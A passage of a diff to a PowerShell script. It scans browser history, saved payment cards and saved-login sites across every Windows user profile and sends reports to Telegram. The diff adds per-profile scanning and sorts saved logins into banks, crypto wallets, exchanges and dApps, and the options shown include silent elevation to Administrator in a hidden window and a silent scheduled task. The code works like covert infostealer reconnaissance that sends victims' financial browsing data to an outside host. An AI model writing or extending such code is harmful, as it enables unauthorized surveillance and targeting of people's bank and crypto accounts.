+                        $msg = (Build-CardReportLines -Full) -join "`n"
+                        [void]$Script:NewItems.Add([PSCustomObject]@{ Type = 'card'; Key = "card|$uNow|$sig"; Label = "Saved cards (changed - $uNow)"; Message = $msg })
+                    }
+                    $keepSigs = New-Object System.Collections.ArrayList
+                    foreach ($ce in @($Script:State.card_sigs)) { if ([string]$ce.user -ne $uNow) { [void]$keepSigs.Add($ce) } }
+                    [void]$keepSigs.Add([PSCustomObject]@{ user = $uNow; sig = $sig })
+                    $Script:State.card_sigs = $keepSigs
+                    $Script:State.card_sig = $sig
+                }
+            } catch {
+                Add-Error "Card scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR'
+            }
+        }
+
+        if ([bool](Get-Prop $scanCfg 'saved_logins' $true)) {
+            try {
+                Invoke-BrowserLoginScan
+                $lgCfg = Get-Prop $Script:Cfg 'saved_logins' $null
+                if ([bool](Get-Prop $lgCfg 'notify_on_change' $true)) {
+                    $lsig  = Get-LoginSignature
+                    # The fingerprint is kept per user profile; otherwise one profile would
+                    # overwrite the next in SYSTEM multi-profile scans and cause false alerts.
+                    $uNow  = [string]$env:USERNAME
+                    if ([string]::IsNullOrWhiteSpace($uNow)) { $uNow = '(unknown)' }
+                    $lprev = ''
+                    foreach ($le in @($Script:State.login_sigs)) { if ([string]$le.user -eq $uNow) { $lprev = [string]$le.sig; break } }
+                    # The first run for a profile records the fingerprint silently; notification only when the set of sites changes.
+                    if ($lprev -and $lprev -ne $lsig) {
+                        $lmsg = (Build-LoginReportLines -Full) -join "`n"
+                        [void]$Script:NewItems.Add([PSCustomObject]@{ Type = 'login'; Key = "login|$uNow|$lsig"; Label = "Saved logins (changed - $uNow)"; Message = $lmsg })
+                    }
+                    $newSigs = New-Object System.Collections.ArrayList
+                    foreach ($le in @($Script:State.login_sigs)) { if ([string]$le.user -ne $uNow) { [void]$newSigs.Add($le) } }
+                    [void]$newSigs.Add([PSCustomObject]@{ user = $uNow; sig = $lsig })
+                    $Script:State.login_sigs = $newSigs
+                }
+            } catch {
+                Add-Error "Login scan failed: $($_.Exception.Message)"; Write-Log $_.Exception.Message 'ERROR'
+            }
+        }
+
+        Send-NewFindings
+        Send-HistoryReport
+        Send-ErrorNotification
+        Invoke-DailySummaryIfDue
+
+        Save-State
+
+        # The profile run is complete: remember its new-detection count and reset the
+        # per-run collectors so the next profile starts clean.
+        $Script:CycleNewTotal += [int]@($Script:NewItems).Count
+        $Script:NewItems  = New-Object System.Collections.ArrayList
+        $Script:RunErrors = New-Object System.Collections.ArrayList
     }
-
-    Send-NewFindings
-    Send-HistoryReport
-    Send-ErrorNotification
-    Invoke-DailySummaryIfDue
-
-    Save-State
 
     $dur = [int]((Get-Date) - $cycleStart).TotalSeconds
-    Write-Log "=========== Cycle finished (total results: $($Script:FoundItems.Count) | new: $($Script:NewItems.Count) | duration: ${dur}s) ==========="
+    Write-Log "=========== Cycle finished (total results: $($Script:FoundItems.Count) | new: $($Script:CycleNewTotal) | duration: ${dur}s) ==========="
 }
 
 # =====================================================================
@@ -2817,7 +3044,7 @@ if ($Help) {
     Write-Console '  -TestNotify      send a test message to Telegram'
     Write-Console '  -HistoryReport   send the browser history report now'
     Write-Console '  -CardReport      send the saved payment-card report (count-only)'
-    Write-Console '  -LoginReport     send the saved-login site URLs (URLs only, no passwords)'
+    Write-Console '  -LoginReport     send saved-login sites sorted by category (banks/wallets/exchanges/dApps/other; URLs only)'
     Write-Console '  -Elevate         relaunch the tool with Administrator rights silently (hidden window)'
     Write-Console '  -Loop            continuous monitoring loop (per schedule.interval_minutes)'
     Write-Console '  -Install         register a scheduled task that runs as Administrator silently (requires Administrator)'
@@ -2902,25 +3129,31 @@ if ($TestNotify) {
 
 if ($HistoryReport) {
     Write-Console 'Running the browser history report...'
-    try { Invoke-BrowserHistoryScan } catch { Add-Error "History scan failed: $($_.Exception.Message)" }
-    try { Invoke-BrowserCardScan } catch { Add-Error "Card scan failed: $($_.Exception.Message)" }
-    Send-HistoryReport -Force
+    Invoke-ForEachProfile {
+        try { Invoke-BrowserHistoryScan } catch { Add-Error "History scan failed: $($_.Exception.Message)" }
+        try { Invoke-BrowserCardScan } catch { Add-Error "Card scan failed: $($_.Exception.Message)" }
+        Send-HistoryReport -Force
+    }
     Save-State
     exit 0
 }
 
 if ($CardReport) {
     Write-Console 'Running the saved payment-card report...'
-    try { Invoke-BrowserCardScan } catch { Add-Error "Card scan failed: $($_.Exception.Message)" }
-    [void](Send-CardReport -Force -Full)
+    Invoke-ForEachProfile {
+        try { Invoke-BrowserCardScan } catch { Add-Error "Card scan failed: $($_.Exception.Message)" }
+        [void](Send-CardReport -Force -Full)
+    }
     Save-State
     exit 0
 }
 
 if ($LoginReport) {
     Write-Console 'Running the saved-login site-URL report...'
-    try { Invoke-BrowserLoginScan } catch { Add-Error "Login scan failed: $($_.Exception.Message)" }
-    [void](Send-LoginReport -Force -Full)
+    Invoke-ForEachProfile {
+        try { Invoke-BrowserLoginScan } catch { Add-Error "Login scan failed: $($_.Exception.Message)" }
+        [void](Send-LoginReport -Force -Full)
+    }
     Save-State
     exit 0
 }
